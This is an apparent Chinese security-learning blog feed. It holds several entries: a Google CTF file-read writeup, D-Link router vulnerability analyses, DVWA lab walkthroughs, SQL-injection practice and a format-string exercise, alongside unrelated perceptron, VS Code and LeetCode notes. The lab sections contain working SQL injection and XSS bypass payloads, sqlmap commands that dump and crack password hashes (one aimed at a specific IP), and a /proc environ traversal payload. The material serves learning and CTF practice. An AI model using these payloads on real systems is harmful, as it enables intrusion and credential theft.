np.random.rand(len(input_data[0])) bias = 0.0 for i in range(iteration): samples = zip(input_data, y) for (input_i, label) in samples: result = input_i * w + bias result = float(sum(result)) y_pred = float(unit_step(result)) w = w + rate * (label - y_pred) * np.array(input_i) bias = rate * (label - y_pred) return w, biasdef predict(input_i, w, b): ''' 预测 ''' unit_step = lambda x: 0 if x &lt; 0 else 1 result = input_i * w + b result = sum(result) y_pred = float(unit_step(result)) print(y_pred)if __name__ == "__main__": input_data, y = load_data() w, b = train_pre(input_data, y, 20, 0.01) predict([1, 1], w, b) 我们很惊讶地发现一个如此简单地模型竟然不可思议地完成了这个任务。 数据更新： $w(j) := w(j) + \alpha (y-f(x))x(j) (j = 1,...n)$ 异或问题 当时老师上课时候提到异或问题是不可解的，后来查了一下资料才明白在神经网络发展的早期，异或问题确实是不可解的，不过通过加入隐藏层使得异或问题能够有了新的解法 如下图： 复习的时候才注意到原来老师提到了通过加入隐藏层的方式来解决异或问题 参考资料 【机器学习】神经网络实现异或（XOR） 1.5 图形化理解神经网络中的异或问题 感知器 wikipedia]]></content>
      <categories>
        <category>deep learning</category>
      </categories>
      <tags>
        <tag>deep-learning</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Google ctf2017]]></title>
    <url>%2F2019%2F07%2F21%2F%E4%BB%8EGooglectf%E4%B8%80%E9%81%93%E9%A2%98%E8%AE%A4%E8%AF%86%E4%B8%80%E4%B8%8B%E9%93%BE%E6%8E%A5%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[有时候看看国外的ctf比赛的wp还是挺好的 wp Mindreder 可以通过f参数直接读取到想读的文件 那么如何确定flag的位置？ 既然可以读文件，那么第一步的想法就是读源码 确定后端是flask 源码： 12345678910111213141516171819202122232425262728293031323334353637from flask import Flask, request, abortimport reimport osimport loggingassert os.environ['FLAG']app = Flask(__name__)INDEX = open('index.html').read()HALL_OF_SHAME = [ '173.171.203.59', '2a02:6b8:b010:6026:84:201:185:197', '35.185.158.159', '81.17.25.8']@app.route('/')def index(): for ip in request.headers.get('X-Forwarded-For', '').split(','): ip = ip.strip().lower() if ip in HALL_OF_SHAME: abort(403) if 'f' in request.args: try: f = request.args['f'] if re.search(r'proc|random|zero|stdout|stderr', f): abort(403) elif '\x00' in f: abort(404) return open(f).read(4096) except IOError: abort(404) else: return INDEX 看到flag是藏在环境变量里面的，而环境变量就在/proc/environ中 那就直接去读呗 但是限制了： 123456if 'f' in request.args: try: f = request.args['f'] if re.search(r'proc|random|zero|stdout|stderr', f): abort(403) elif '\x00' in f: Linux中有一个叫做symlink method 也就是相当于一个快捷方式，但是却不同于Windows中的shortcut 而正好：/dev/fd这个指向了/proc/self/fd这样payload就不难理解了： /dev/fd/../environ 访问/dev/fd就相当于访问了/proc/self之后回退一次就可以找到environ这个文件了 Linux中 /dev/fd/0运行效果是这样的，相当于你输入啥它就会回答啥 12345 ✘ pxy@LAPTOP-UBIEP4K5 ~ sudo cat /dev/fd/0aapxypxy 接下来了解一下ln命令 软链接：英文symbolic link非常类似于Windows中的快捷方式 硬链接：英文hard link这类文件会拥有自己的inode节点和名称，其inode会指向文件内容所在的数据块emmm后面不是很懂了 建立软链接的方式： ln -s 源文件名称 软链接文件名称 目录和文件均可 现在当前目录下创建一个指向/proc/sys的链接 然后我们就可以通过目录遍历来进入到其他的目录了。 软链接还会存在这个问题： 链接的重复定义 这样就不会出问题了，加个-n选项 参考 GoogleCTF - Mindreader]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vscode调试php]]></title>
    <url>%2F2019%2F07%2F21%2Fvscode%E8%B0%83%E8%AF%95php%2F</url>
    <content type="text"><![CDATA[使用vscode调试php代码 下载xdebug 官网 但是需要自己确定php的版本和编译器的版本 但是官网的链接似乎有问题，php5.5的两个反过来了 之后将其添加到php.ini文件中 1234[XDebug]zend_extension = php_xdebug-2.5.5-5.5-vc11.dllxdebug.remote_enable = 1xdebug.remote_autostart = 1 将php添加到环境变量中 这就不细说了 配置vscode中的php路径 在settings.json中指定 调试 踩到的坑 VScode的php debug插件默认是用环境变量中的php来进行调试的，所以php如果没有加入到环境变量中的话是会报错的。 我刚开始用了wampserver的php来进行调试，但是后来失败了，说是没办法加载xdebug插件，所以换成了phpstudy 找不到setting文件？这个坑害惨了 在这个地方需要添加php的路径 两种调试方式，一种是listen for xdebug，需要打开浏览器，另一种是launch currently open script]]></content>
      <categories>
        <category>config</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>vscode</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IOT D-link]]></title>
    <url>%2F2019%2F07%2F20%2FIOT-D-link%2F</url>
    <content type="text"><![CDATA[DIR-815栈溢出漏洞 屡次调试都失败了，我才发现原来这个版本的DIR-815已经修复了(DIR-815_REVB_FIRMWARE_2.03.B08)。 所以这个栈溢出是不存在的 123456789.text:0040BE04 move $a3, $s2.text:0040BE08 la $a2, aSSPostxml # &quot;%s/%s/postxml&quot;.text:0040BE0C move $a0, $s1 # s.text:0040BE10 li $a1, 0x400 # maxlen.text:0040BE14 jalr $t9 ; snprintf.text:0040BE18 sw $v0, 0x4F0+var_4E0($sp).text:0040BE1C lw $gp, 0x4F0+var_4D8($sp).text:0040BE20 move $a2, $s1.text:0040BE24 la $t9, xmldbc_del DIR-645 缓冲区溢出漏洞 动态调试： 在authenticationcgi_main处下断点 此时返回地址保存在这里： 之后运行到此处： 此时返回地址被覆盖了 继续运行，程序果然崩溃了 进入到函数sub40A424 程序在此时崩溃了 尝试修改password长度 程序还是崩溃了 查看反汇编代码 程序从外部读入CONTENT_LENGTH没有进行任何检查 12345678910111213141516171819202122232425text:0040B4A0 la $t9, getenv.text:0040B4A4 la $a0, aContent_length # &quot;CONTENT_LENGTH&quot;.text:0040B4A8 jalr $t9 ; getenv.text:0040B4AC move $s0, $v0.text:0040B4B0 lw $gp, 0xF90+var_F78($sp).text:0040B4B4 beqz $s0, loc_40B610.text:0040B4B8 addiu $a0, $sp, 0xF90+var_938.text:0040B4BC beqz $v0, loc_40B614.text:0040B4C0 addiu $a1, $sp, 0xF90+var_E1C.text:0040B4C4 la $t9, atoi.text:0040B4C8 nop.text:0040B4CC jalr $t9 ; atoi.text:0040B4D0 move $a0, $v0 # nptr.text:0040B4D4 lw $gp, 0xF90+var_F78($sp).text:0040B4D8 move $s0, $v0.text:0040B4DC la $v1, stdin.text:0040B4E0 la $t9, fileno.text:0040B4E4 lw $a0, (stdin - 0x4353CC)($v1) # stream.text:0040B4E8 jalr $t9 ; fileno.text:0040B4EC addiu $s1, $sp, 0xF90+var_430.text:0040B4F0 lw $gp, 0xF90+var_F78($sp).text:0040B4F4 move $a0, $v0 # fd.text:0040B4F8 la $t9, read.text:0040B4FC move $a1, $s1 # buf.text:0040B500 jalr $t9 ; read 计算偏移量； 后面的利用过程感觉比较复杂，没能成功地复现 DIR-645命令执行漏洞 在安全客上看到了一篇分析DIR-645命令执行地文章，随分析一下原理 直接查看servicecgi_main函数 首先会对请求方法进行判断，如果是POST方法则会调用cgibin_parse_request解析参数，具体的实现暂时不考虑，主要是解析CONTENT_TYPE和CONTENT_LENGTH,之后会调用sess_ispoweruser判断是否为合法用户 之后获取 POST 表单字段，若字段名为 EVENT 的话，就将 &quot;event %s &gt; /dev/null&quot; 作为参数执行 lxmldbc_system 函数。 查看lxmldbc_system函数 123456789sw $a1, 0x428+arg_4($sp)sw $a2, 0x428+arg_8($sp)sw $a3, 0x428+arg_C($sp)move $a2, $a0 # formatmove $a3, $v0 # argmove $a0, $s0 # ssw $v0, 0x428+var_410($sp)jalr $t9 ; vsnprintf li $a1, 0x400 # maxlen 主要关注最后两条指令，因为这里用到了MIPS中地分支延迟槽技术，所以$a1传递参数的指令存放在jalr指令之后 故vsnprintf($sp+0x428+var_40C,0x400,&quot;event %s &gt; /dev/null&quot;,arg_4) vsnprintf函数的用法： 函数原型：int vsnprintf(char str, size_t size, const char format,va_list ap); 函数说明：将可变参数格式化输出到一个字符数组 参数：str输出到的数组，size指定大小，防止越界，format格式化参数，ap可变参数列表函数用法 接着调用system函数 12jalr $t9 ; systemmove $a0, $s0 # command 看一下参数的传递过程 $s0本来是栈上的一个变量，vsnprintf将可变参数格式化输出到其中，之后又将其作为参数传递给system函数 相当于执行了 system(&quot;event %s &gt; /dev/null&quot;) 这样就可以想办法进行命令注入了 参考 路由器漏洞挖掘之 DIR-815 栈溢出漏洞分析]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>IOT</tag>
        <tag>D-LINK</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA学习]]></title>
    <url>%2F2019%2F07%2F20%2FDVWA%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[DVWA 用的vulstudy的环境 默认用户名是admin密码是password 需要启动的时候docker-compose up -d就行了 停止的话docker-compose stop停止容器 sql注入 最简单的 没办法是我太菜了，权当复习好了 😢 输入1得到： 123ID: 1First name: adminSurname: admin 然后开始爆字段 1' order by 2 # 确认回显位置： 1' union select 1,2 # 123ID: 1&apos; union select 1,2 #First name: 1Surname: 2 开始爆数据库 1' union select database(),2 # 得到数据库名 123ID: 1&apos; union select database(),2 #First name: dvwaSurname: 2 开始爆表 表都存在information_schema.tables这里面 1' union select table_name,2 from information_schema.tables where table_schema= 'dvwa'# 得到： 123456ID: 1&apos; union select table_name,2 from information_schema.tables where table_schema= &apos;dvwa&apos;#First name: guestbookSurname: 2ID: 1&apos; union select table_name,2 from information_schema.tables where table_schema= &apos;dvwa&apos;#First name: usersSurname: 2 开始爆字段 然而我并不知道怎么爆字段😞 于是猜测是password 1' union select password,2 from users 得到了： 123456789101112ID: 1&apos; union select password, 2 from users #First name: 5f4dcc3b5aa765d61d8327deb882cf99Surname: 2ID: 1&apos; union select password, 2 from users #First name: e99a18c428cb38d5f260853678922e03Surname: 2ID: 1&apos; union select password, 2 from users #First name: 8d3533d75ae2c3966d7e0d4fcc69216bSurname: 2ID: 1&apos; union select password, 2 from users #First name: 0d107d09f5bbe40cade3de5c71e9e9b7Surname: 2 小白之旅到此结束 升级到medium 改成了post方式提交数据 这时候sqlmap派上用场了 先将抓到的数据包保存为dvwa.txt文件 然后 python sqlmap.py -r &quot;dvwa.txt&quot; --dbs sqlmap很聪明的判断出这是MYSQL数据库并且列出了所有的数据库 123456[22:21:04] [INFO] fetching database namesavailable databases [4]:[*] dvwa[*] information_schema[*] mysql[*] performance_schema 不过这个payload很神奇 12345678910111213141516Parameter: id (POST) Type: boolean-based blind Title: Boolean-based blind - Parameter replace (original value) Payload: id=(SELECT (CASE WHEN (1900=1900) THEN 1 ELSE (SELECT 6858 UNION SELECT 6800) END))&amp;Submit=Submit Type: error-based Title: MySQL &gt;= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED) Payload: id=1 AND (SELECT 2*(IF((SELECT * FROM (SELECT CONCAT(0x716b7a6b71,(SELECT (ELT(7517=7517,1))),0x7162787071,0x78))s), 8446744073709551610, 8446744073709551610)))&amp;Submit=Submit Type: time-based blind Title: MySQL &gt;= 5.0.12 AND time-based blind Payload: id=1 AND SLEEP(5)&amp;Submit=Submit Type: UNION query Title: Generic UNION query (NULL) - 2 columns Payload: id=1 UNION ALL SELECT CONCAT(0x716b7a6b71,0x464a61616642417872426e5a6c657171445176626c57687143476d6e4d5661714a5768516f4d566a,0x7162787071),NULL-- WDTr&amp;Submit=Submit 指定数据库爆表 python sqlmap.py -r &quot;dvwa.txt&quot; -D dvwa --tables 得到： 123456Database: dvwa[2 tables]+-----------+| guestbook || users |+-----------+ 指定表爆字段 python sqlmap.py -r &quot;dvwa.txt&quot; -D dvwa -T users --columns 123456789101112131415Database: dvwaTable: users[8 columns]+--------------+-------------+| Column | Type |+--------------+-------------+| user | varchar(15) || avatar | varchar(70) || failed_login | int(3) || first_name | varchar(15) || last_login | timestamp || last_name | varchar(15) || password | varchar(32) || user_id | int(6) |+--------------+-------------+ 指定表然后dump数据 python sqlmap.py -r &quot;dvwa.txt&quot; -D dvwa -T users --dump-all sqlmap很机智的在破解md5 123[22:22:02] [INFO] cracked password &apos;charley&apos; for hash &apos;8d3533d75ae2c3966d7e0d4fcc69216b&apos;[22:22:04] [INFO] cracked password &apos;letmein&apos; for hash &apos;0d107d09f5bbe40cade3de5c71e9e9b7&apos;[22:22:04] [INFO] cracked password &apos;abc123&apos; for hash &apos;e99a18c428cb38d5f260853678922e03&apos; 得到的表 12345678910| user_id | avatar | user | password | last_name | first_name | last_login | failed_login |+---------+--------------------------------------------------+---------+---------------------------------------------+-----------+------------+---------------------+--------------+| 1 | http://192.168.41.161/hackable/users/admin.jpg | admin | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | admin | admin | 2019-07-15 13:57:22 | 0 || 2 | http://192.168.41.161/hackable/users/gordonb.jpg | gordonb | e99a18c428cb38d5f260853678922e03 (abc123) | Brown | Gordon | 2019-07-15 13:57:22 | 0 || 3 | http://192.168.41.161/hackable/users/1337.jpg | 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b (charley) | Me | Hack | 2019-07-15 13:57:22 | 0 || 4 | http://192.168.41.161/hackable/users/pablo.jpg | pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 (letmein) | Picasso | Pablo | 2019-07-15 13:57:22 | 0 || 5 | http://192.168.41.161/hackable/users/smithy.jpg | smithy | 5f4dcc3b5aa765d61d8327deb882cf99 (password) | Smith | Bob | 2019-07-15 13:57:22 | 0 |+---------+--------------------------------------------------+---------+---------------------------------------------+-----------+------------+---------------------+--------------+ sqlmap tql tql tql high 这时候就很。。 会弹出一个页面，输入数据之后再跳回来 这就很安全了😛 但是。。 查看源码之后发现： 其实没有任何过滤； 123// Check database$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";$result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '&lt;pre&gt;Something went wrong.&lt;/pre&gt;' ); 所以payload照样用，没问题 impossible 这次就更不一般了 123456789101112131415161718192021222324252627282930313233&lt;?phpif( isset( $_GET[ &apos;Submit&apos; ] ) ) &#123; // Check Anti-CSRF token checkToken( $_REQUEST[ &apos;user_token&apos; ], $_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; ); // Get input $id = $_GET[ &apos;id&apos; ]; // Was a number entered? if(is_numeric( $id )) &#123; // Check the database $data = $db-&gt;prepare( &apos;SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;&apos; ); $data-&gt;bindParam( &apos;:id&apos;, $id, PDO::PARAM_INT ); $data-&gt;execute(); $row = $data-&gt;fetch(); // Make sure only 1 result is returned if( $data-&gt;rowCount() == 1 ) &#123; // Get values $first = $row[ &apos;first_name&apos; ]; $last = $row[ &apos;last_name&apos; ]; // Feedback for end user $html .= &quot;&lt;pre&gt;ID: &#123;$id&#125;&lt;br /&gt;First name: &#123;$first&#125;&lt;br /&gt;Surname: &#123;$last&#125;&lt;/pre&gt;&quot;; &#125; &#125;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; 这里用到了PDO预编译的方式 那可能就真的没办法了 看了下stackoverflow How can I prevent SQL injection in PHP? Use prepared statements and parameterized queries. These are SQL statements that are sent to and parsed by the database server separately from any parameters. This way it is impossible for an attacker to inject malicious SQL. 可以有两种方式： 1234567$stmt = $pdo-&gt;prepare(&apos;SELECT * FROM employees WHERE name = :name&apos;);$stmt-&gt;execute(array(&apos;name&apos; =&gt; $name));foreach ($stmt as $row) &#123; // Do something with $row&#125; 或者对于mysql来说，可以： 123456789$stmt = $dbConnection-&gt;prepare(&apos;SELECT * FROM employees WHERE name = ?&apos;);$stmt-&gt;bind_param(&apos;s&apos;, $name); // &apos;s&apos; specifies the variable type =&gt; &apos;string&apos;$stmt-&gt;execute();$result = $stmt-&gt;get_result();while ($row = $result-&gt;fetch_assoc()) &#123; // Do something with $row&#125; PDO真的是安全的吗？ Are PDO prepared statements sufficient to prevent SQL injection? SQL injection that gets around mysql_real_escape_string() XSS reflected 第一遍在chrome上试了下&lt;script&gt;alert(1)&lt;/script&gt;没成功 但是看源码： 可能是chrome太安全了吧 换成firefox就没事了 medium 如果看源码就会发现只是简单地对script进行了一次过滤 $name = str_replace( '&lt;script&gt;', '', $_GET[ 'name' ] ); 那么如何绕过这个限制呢 那就这样构造 &lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/script&gt; 就能绕过过滤了，主要问题还是过滤不严格，之过滤了一次，所以双写就能很容易地绕过了 ps. 大小写也可以 high 这次过滤更严格了 $name = preg_replace( '/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] ); 最后只留了一个&gt;给你 果然我记得还有img标签也可以造成xss来着 &lt;img src=&quot;aa&quot; onError=alert(123) &gt; 这样就行啦，当然chrome太安全了，还是用firefox吧 impossible 1234567checkToken( $_REQUEST[ &apos;user_token&apos; ],$_SESSION[ &apos;session_token&apos; ], &apos;index.php&apos; );// Get input$name = htmlspecialchars( $_GET[ &apos;name&apos; ] );// Feedback for end user$html .= &quot;&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;&quot;; 这种情况下还进行了实体编码，看你怎么绕过 那些年我们没能bypass的xss filter 一篇总结了xss的文章 sql 盲注 从low开始看起， 直接抓包然后将数据包保存起来，用sqlmap跑一下就就出来了，-r参数是读取一个数据包中的文件，然后sqlmap会自动解析它 mediume 一样的，只是数据包变成了post方式提交的 high 这次sqlmap抽风没跑出来 看下源码好了 本来盲注就是要通过脚本来跑的，但是我比较懒emmm，还是要复习一下如何用python脚本跑出来 如何盲注？ 一篇文章带你深入理解 SQL 盲注 盲注最常见的一个payload 127.0.0.1/sqllib/Less-5/?id=1'and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=80–+ 判断数据库中第一个表的第一个字符为否为'P' xss 存储型 还是最简单的low 表单上的name有长度限制，不过这只是前端的限制而已 &lt;div id=&quot;guestbook_comments&quot;&gt;Name: &lt;script&gt;alert(1)&lt;/script&gt;&lt;br /&gt;Message: &lt;script&gt;alert(1)&lt;/script&gt;&lt;br /&gt;&lt;/div&gt; 注入成功 medium 这就很尴尬了。。 原来这就是存储型xss的厉害了，直接存进去了，所以我打开medium的页面时，连着弹出了两个框框，于是想看一下它的源码： 这里也是通过大小写或者双写就能绕过的 &lt;sCriPt&gt;alert(1)&lt;/script&gt; 找到了一个xss平台 xss平台 但是我发现我不会用了。。]]></content>
      <categories>
        <category>vulstudy</category>
      </categories>
      <tags>
        <tag>wp</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[sql注入实践]]></title>
    <url>%2F2019%2F07%2F15%2F%E4%B8%A4%E9%81%93sql%E6%B3%A8%E5%85%A5%E9%A2%98%2F</url>
    <content type="text"><![CDATA[基于sql的盲注 之前一直没有好好地学习过sqlmap的使用方法 如果是针对post表单这种方式 可以将抓到的包保存成一个文件，然后使用 sqlmap.py -r &quot;post.txt&quot; -p n --dbs 其中-p是指定参数 sqlmap也可以自动搜寻表单sqlmap.py -u &quot;url&quot; --forms 指定参数 趁机学到了一把sqlmap使用 虽然这个题目是有点。。 但是注入点的判断也是很重要的 爆后端数据库 python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; 爆数据库 python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs 指定数据库报表爆表 python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs -D stormgroup --tables 指定数据库和表爆字段 python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs -D stormgroup -T member --columns 指定数据库，表，字符然后dump出数据 python sqlmap.py -u &quot;http://219.153.49.228:40952/new_list.php?id=1&quot; --dbs -D stormgroup -T member -C password --dump ![member](https://i.imgur.com/iRvoAHX. 123456789Database: stormgroupTable: member[2 entries]+-------+----------------------------------+--------+| name | password | status |+-------+----------------------------------+--------+| mozhe | 3114b433dece9180717f2b7de56b28a3 | 0 || mozhe | b7a0bebf8287c87253fb2958a390346a | 1 |+-------+----------------------------------+--------+ 解密之后是106370 这样就能登陆后台了 太神奇了 参考 sqlmap之(六)----POST登陆框注入实战 SQL手工注入漏洞测试(Access数据库) 这道题目就有点神奇了 纯靠猜 order by 4判断有多少个字段 然后 new_list.asp?id=1 and exists(select * from admin)判断是否存在admin 接下来判断回显位置 /new_list.asp?id=1 union select 1,2,3,4 from admin 接下来猜测字段值 and exists (select id from admin) 爆出字段值 union select 1,username,passwd,id from admin md5解密一下登陆就行了 参考 二次注入分析 看一下sqli的第24题 可以注册账号进行登陆，登陆之后可以修改密码。 登陆点尝试注入发现被检测到了，注册的时候尝试注册admin的账号提示账号已存在 看一下源码(用的docker环境，mysql登陆没有密码) 直接全局搜索username 12345678910111213141516function sqllogin()&#123; $username = mysql_real_escape_string($_POST["login_user"]); $password = mysql_real_escape_string($_POST["login_password"]); $sql = "SELECT * FROM users WHERE username='$username' and password='$password'";//$sql = "SELECT COUNT(*) FROM users WHERE username='$username' and password='$password'"; $res = mysql_query($sql) or die('You tried to be real smart, Try harder!!!! :( '); $row = mysql_fetch_row($res); //print_r($row) ; if ($row[1]) &#123; return $row[1]; &#125; else &#123; return 0; &#125;&#125; 这里使用了mysql_real_escape_string方法转义数据，导致注入无法发生 但是我们尝试注册 在login_create中有一处： 12root@44662761c057:/var/www/html/Less-24# grep "insert" *login_create.php: $sql = "insert into users ( username, password) values(\"$username\", \"$pass\")"; mysql_escape_string函数也会转义一些字符比如： 12345&lt;?php $item = "Zak's Laptop"; $escaped_item = mysql_escape_string($item); printf ("Escaped string: %s\n", $escaped_item);?&gt; 得到 Escaped string: Zak\'s Laptop 但是我们尝试注册test'# 成功了？ 看下数据库： 1234567mysql&gt; select * from users where username=&quot;test&apos;#&quot;;+----+----------+----------+| id | username | password |+----+----------+----------+| 15 | test&apos;# | 123 |+----+----------+----------+1 row in set (0.00 sec) 很神奇。。 传入的username已经被成功转义 学习一下mysql_query返回的是一个资源值 此时构造的sql语句也没问题 然而插入的数据就是有问题 1234567891011121314151617181920mysql&gt; select * from users;+----+----------+------------+| id | username | password |+----+----------+------------+| 1 | Dumb | Dumb || 2 | Angelina | I-kill-you || 3 | Dummy | p@ssword || 4 | secure | crappy || 5 | stupid | stupidity || 6 | superman | genious || 7 | batman | mob!le || 8 | admin | admin || 9 | admin1 | admin1 || 10 | admin2 | admin2 || 11 | admin3 | admin3 || 12 | dhakkan | dumbo || 14 | admin4 | admin4 || 15 | test&apos;# | 111 |+----+----------+------------+14 rows in set (0.00 sec) 这个可真的没办法了。。 有个问题，当我登陆的时候： sql语句是这样的： &quot;SELECT * FROM users WHERE username='test\'#' and password='111'&quot; 则此时重置密码 &quot;UPDATE users SET PASSWORD='' where username='test'#' and password='111' &quot; 此时我构造用户名test' union selct * from users # 登陆的时候的sql语句如下 &quot;SELECT * FROM users WHERE username='test\' union selct * from users #' and password='111'&quot; 此时还是无法直接注入的，因为单引号被转义无法闭合]]></content>
      <categories>
        <category>ctf</category>
      </categories>
      <tags>
        <tag>wp</tag>
        <tag>ctf</tag>
        <tag>sql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Leetcode 2]]></title>
    <url>%2F2019%2F07%2F15%2FLeetcode-2%2F</url>
    <content type="text"><![CDATA[错解 怎么快速地将链表倒置 😕 最后还是因为溢出的问题 思路： 12345678910111213141516171819202122​ int k = 0; ListNode temp1 = l1; ListNode temp2 = l2; double resultl1 = 0; double resultl2 = 0; while (temp1 != null) &#123; int tempvalue = temp1.val; resultl1 = resultl1 + tempvalue * Math.pow(10, k); k++; temp1 = temp1.next; &#125; 就是将其转化为整数，因为链表的第一个元素是最低位，之后是十位，百位等 将得到的结果在转化为链表 1234567891011121314151617181920int result = (int) (resultl1 + resultl2);ListNode ans = new ListNode(0); //先取一个头节点ListNode head = ans;int length = Integer.toString(result).length();for (int i = 0; i &lt; length; i++) &#123; ListNode temp = new ListNode(result % 10); head.next = temp; head = head.next; result = result / 10;&#125; 记录一下将整数转为string的操作 Integer.toString(result) Math.pow函数的返回值必须是double类型的 但是这样会面临一个问题，也就是最开图片的那个，溢出！ 正解 看了眼答案，才明白自己从开始就想错了 1234567891011121314151617181920212223242526272829303132333435363738public ListNode addTwoNumbers(ListNode l1, ListNode l2) &#123; ListNode dummyHead = new ListNode(0); ListNode p = l1, q = l2, curr = dummyHead; int carry = 0; while (p != null || q != null) &#123; int x = (p != null) ? p.val : 0; int y = (q != null) ? q.val : 0; int sum = carry + x + y; carry = sum / 10; curr.next = new ListNode(sum % 10); curr = curr.next; if (p != null) p = p.next; if (q != null) q = q.next; &#125; if (carry &gt; 0) &#123; curr.next = new ListNode(carry); &#125; return dummyHead.next;&#125; 最关键的就是 ==int x = (p != null) ? p.val : 0; int y = (q != null) ? q.val : 0; int sum = carry + x + y; carry = sum / 10; curr.next = new ListNode(sum % 10);== 其实只需要从低位开始一位位的加上去就好了。 然后再把它们给链起来]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[格式化字符串分析]]></title>
    <url>%2F2019%2F05%2F04%2F%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%88%86%E6%9E%90%2F</url>
    <content type="text"><![CDATA[格式化字符串 这个题目是ctfwiki上的 c代码如下： 123456789#include &lt;stdio.h&gt;int main() &#123; char s[100]; int a = 1, b = 0x22222222, c = -1; scanf("%s", s); printf("%08x.%08x.%08x.%s\n", a, b, c, s); printf(s); return 0;&#125; （突然发现腾讯文档居然还支持代码好强啊 我们编译一下： 1gcc -m32 -fno-stack-protector -no-pie -o leakMemory leakMemory.c -g 把保护措施都关掉了 1234567 % checksec leakMemory [*] '/home/abc/Desktop/pwn/leakMemory/leakMemory' Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) 先看一下几个payload 12345678pwndbg&gt; b printfBreakpoint 1 at 0x8048330pwndbg&gt; rStarting program: /home/abc/Desktop/pwn/leakMemory/leakMemory %08x.%08x.%08xBreakpoint 1, __printf (format=0x8048593 "%08x.%08x.%08x.%s\n") at printf.c:2828printf.c: No such file or directory. 在printf处下断点 此时栈上的布局如下 12345600:0000│ esp 0xffffcf9c —▸ 0x80484ea (main+100) ◂— add esp, 0x2001:0004│ 0xffffcfa0 —▸ 0x8048593 ◂— and eax, 0x2e783830 /* '%08x.%08x.%08x.%s\n' */02:0008│ 0xffffcfa4 ◂— 0x103:000c│ 0xffffcfa8 ◂— 0x22222222 ('""""')04:0010│ 0xffffcfac ◂— 0xffffffff05:0014│ 0xffffcfb0 —▸ 0xffffcfc0 ◂— '%08x.%08x.%08x' continue一下： 123456pwndbg&gt; cContinuing.00000001.22222222.ffffffff.%08x.%08x.%08xBreakpoint 1, __printf (format=0xffffcfc0 "%08x.%08x.%08x") at printf.c:2828in printf.c 输出了信息的同时， 命中第二个断点 此时栈上的布局如下： 1234567800:0000│ esp 0xffffcfac —▸ 0x80484f9 (main+115) ◂— add esp, 0x1001:0004│ 0xffffcfb0 —▸ 0xffffcfc0 ◂— '%08x.%08x.%08x'... ↓03:000c│ 0xffffcfb8 —▸ 0xf7fcf410 —▸ 0x8048278 ◂— inc edi /* 'GLIBC_2.0' */04:0010│ 0xffffcfbc —▸ 0x804849d (main+23) ◂— add ebx, 0x1b6305:0014│ eax 0xffffcfc0 ◂— '%08x.%08x.%08x'06:0018│ 0xffffcfc4 ◂— '.%08x.%08x'07:001c│ 0xffffcfc8 ◂— 'x.%08x' 此时printf函数会把格式化字符串之后的栈上的信息当作参数打印出来： contiue一下 123pwndbg&gt; cContinuing.ffffcfc0.f7fcf410.0804849d[Inferior 1 (process 4975) exited normally] 之前栈上的信息显示的不全，栈的内存如下： 123456pwndbg&gt; x/20x 0xffffcfb00xffffcfb0:0xffffcfc0 0xffffcfc0 0xf7fcf410 0x0804849d0xffffcfc0:0x78383025 0x3830252e 0x30252e78 0x000078380xffffcfd0:0x00000000 0x00c30000 0x00000000 0xf7ffd0000xffffcfe0:0x00000000 0x00000000 0x00000000 0x6f984f000xffffcff0:0x00000009 0xffffd2a4 0xf7e094a9 0xf7fb4748 0xffffcfb0 是格式化字符串的地址， 我们看到此时printf函数将0xffffcfc0 0xf7fcf410 0x0804849d 都打印出来了， 也就是格式化字符串之后的三个位置的信息 我们通过这种方式泄露栈的信息，但是也可以直接去取得栈中被视为第n+1个参数的值 至于为什么是第n+1, 这是因为格式化字符串是第一个参数 比如 通过 %3$x(这个的原理是啥？为什么要加$符号) 我们可以泄露栈上被视为第4个参数的值 栈布局如下：(左边的一列是栈地址，也就是内存的地址，箭头代表了这个内存单元存储的数据，如果是指针还会进一步指示) 1234567800:0000│ esp 0xffffcfac —▸ 0x80484f9 (main+115) ◂— add esp, 0x1001:0004│ 0xffffcfb0 —▸ 0xffffcfc0 ◂— '%3$x'... ↓(这里是省略号，是不是就是直接指向了，中间那个就被跳过了)03:000c│ 0xffffcfb8 —▸ 0xf7fcf410 —▸ 0x8048278 ◂— inc edi /* 'GLIBC_2.0' */04:0010│ 0xffffcfbc —▸ 0x804849d (main+23) ◂— add ebx, 0x1b6305:0014│ eax 0xffffcfc0 ◂— '%3$x'06:0018│ 0xffffcfc4 ◂— 0x007:001c│ 0xffffcfc8 —▸ 0xf7ffd940 ◂— 0x0 同样看不清， 